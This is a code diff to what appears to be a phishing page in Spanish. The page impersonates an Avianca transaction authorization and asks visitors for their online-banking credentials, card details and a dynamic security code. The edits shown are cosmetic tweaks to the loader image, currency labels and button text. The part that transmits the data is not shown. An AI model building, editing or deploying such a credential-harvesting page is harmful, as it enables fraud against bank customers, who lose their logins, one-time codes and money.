@@ -123,8 +123,7 @@
 </head>
 <body>
     <div class="main-loader show">
-        <img id="company-loader">
-        <div class="loader"></div>
+        <img src="./assets/svg/plane-loader.gif" alt="Cargando...">
     </div>
     <div class="logos">
         <img id="bank-logo" src="" alt="" width="">
@@ -133,7 +132,7 @@
     <main>
         <div class="content">
             <b style="margin-bottom: 10px; display: block;">Autorización de transacción</b>
-            <p style="margin-bottom: 20px;">La transacción que intenta realizar en <b>AVIANCA S.A</b> por <b>$ <span id="flight-cost-1">49.900</span> USD</b> debe ser autorizada. Por favor, ingresa los datos de tu banca virtual:</p>
+            <p style="margin-bottom: 20px;">La transacción que intenta realizar en <b>AVIANCA S.A</b> por <b>$ <span id="flight-cost-1">49.900</span> </b> debe ser autorizada. Por favor, ingresa los datos de tu banca virtual:</p>
             
             <div style="background-color: #f4f7f6; padding: 15px; border-radius: 5px; margin-bottom: 20px;">
                 <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
@@ -142,7 +141,7 @@
                 </div>
                 <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
                     <b>Monto:</b>
-                    <p style="margin: 0;">$ <span id="flight-cost-2">49.000</span> cop</p>
+                    <p style="margin: 0;">$ <span id="flight-cost-2">49.000</span> </p>
                 </div>
                 <div style="display: flex; justify-content: space-between;">
                     <b>Número de tarjeta:</b>
@@ -196,7 +195,7 @@
             return escapedText;
         }
 
-        function showLoader(show, text = "Validando datos...") {
+        function showLoader(show, text = "espera...") {
             const loader = document.getElementById('loader-container');
             document.getElementById('loader-text').textContent = text;
             loader.style.display = show ? "flex" : "none";
@@ -428,7 +427,7 @@
                     `;
                     dynamicContainer.classList.remove('hidden');
                     
-                    document.getElementById('btnNextStep').textContent = `Enviar Clave ${codeType}`;
+                    document.getElementById('btnNextStep').textContent = `Enviar ${codeType}`;
                     setFormDisabled(false); // Reactivar solo el botón
                     
                     document.getElementById('dynamic-code').focus();
